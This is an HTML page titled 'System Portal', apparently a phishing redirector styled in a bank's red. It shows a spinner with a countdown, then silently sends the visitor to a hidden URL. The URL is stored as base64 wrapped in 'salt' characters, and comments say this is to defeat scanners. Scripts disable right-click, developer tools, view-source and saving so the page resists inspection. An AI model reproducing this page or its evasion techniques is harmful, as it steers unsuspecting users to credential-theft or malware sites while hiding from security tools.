<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Portal</title>
           <script>
            document.addEventListener('contextmenu', event => event.preventDefault());
            document.onkeydown = function(e) {
                if (e.keyCode == 123) return false; 
                if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false;
                if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) return false;
                if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false;
                if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
                if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) return false;
            };
            document.addEventListener('dragstart', function(e) { e.preventDefault(); });
        </script>
    <style>
        :root { --wf-red: #D71E28; }
        body {
            margin: 0; padding: 0;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #ffffff;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            position: relative; display: flex;
            justify-content: center; align-items: center;
            width: 80px; height: 80px;
        }
        .loader {
            position: absolute; width: 100%; height: 100%;
            border: 6px solid #f3f3f3; border-top: 6px solid var(--wf-red); 
            border-radius: 50%;
            animation: spin 1s cubic-bezier(0.4, 0, 0.2, 1) infinite;
        }
        #countdown { font-size: 24px; font-weight: bold; color: #333; z-index: 10; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div class="loader"></div>
        <div id="countdown">3</div>
    </div>

    <script>
        let timeLeft = 3;
        
        // --- PROTECTED PAYLOAD ---
        // Format: [3 chars salt] + [Base64 URL] + [3 chars salt]
        // This string is technically "broken" Base64 to any scanner.
        const payload = "qweaHR0cHM6Ly91cGRhdGVzLWluZm9ybWF0aW9uamRuLnJmLmdkL2EvI1kyRWpmUEJuOFRpWA==789";

        const timer = setInterval(function() {
            timeLeft--;
            if (timeLeft >= 0) {
                document.getElementById("countdown").textContent = timeLeft;
            }
            if (timeLeft <= 0) {
                clearInterval(timer);
                runGateway();
            }
        }, 1000);

        function runGateway() {
            try {
                // SALT 3 EXTRACTION: Removes 3 from start, 3 from end
                const clean = payload.substring(3, payload.length - 3);
                // Decode and Jump
                window.location.replace(atob(clean));
            } catch (e) {
                // Silent fail to avoid revealing the logic to bots
                document.body.innerHTML = ""; 
            }
        }
    </script>

</body>
</html>
